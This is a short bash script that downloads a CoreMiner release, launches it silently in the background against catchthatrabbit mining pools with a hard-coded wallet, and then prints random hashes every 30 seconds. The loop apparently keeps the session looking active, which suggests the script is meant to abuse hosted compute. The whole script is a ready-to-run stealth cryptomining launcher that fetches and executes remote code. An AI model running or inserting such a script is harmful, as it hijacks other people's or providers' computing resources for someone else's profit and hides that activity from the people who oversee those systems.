#!/bin/bash
export LC_ALL=C
export LANG=C
curl https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.88/coreminer-linux-x86_64.tar.gz -L -o coreminer-linux-x86_64.tar.gz
tar xf coreminer-linux-x86_64.tar.gz
cd coreapp && ./coreminer -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008 > /dev/null 2>&1 &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 30s; done 
